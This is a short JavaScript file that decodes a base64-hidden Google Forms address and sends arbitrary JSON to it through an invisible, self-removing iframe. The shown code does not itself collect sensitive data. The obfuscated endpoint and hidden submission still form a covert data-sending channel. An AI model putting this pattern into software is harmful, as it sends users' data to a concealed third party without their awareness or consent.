"use strict"

const seed = "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC9lLzFGQUlwUUxTZUxaOXIxSFdPNTJ6UG1tZHV2OHM0LW5QVlVkY0hBY1ZGU0lwc2JMVkNkaHBqWTBnL2Zvcm1SZXNwb25zZT91c3A9cHBfdXJsJmVudHJ5LjU1MTgzOTIwMT0=";
const formURL = atob(seed);
const postfixURL = `&submit=Submit`;

// id is the unique identifer for the payload type, json is the object to send
function submitToForm(id, json)
    {
     // 1. generate json object
     let payload = {id, payload: json};

    // 2. Convert the JSON object to a string.
    const jsonString = JSON.stringify(payload);
  
    // 3. Encode the string to make it safe for a URL query parameter.
    const encodedPayload = encodeURIComponent(jsonString);

    // 4. submit the result via hidden iframe
    let iframe = document.createElement("iframe");
    iframe.src = `${formURL}${encodedPayload}${postfixURL}`;
    iframe.style = "display:none;";
    document.body.appendChild(iframe);    
    setTimeout(()=>
        {
        iframe.remove();    
        }, 3000);
    }

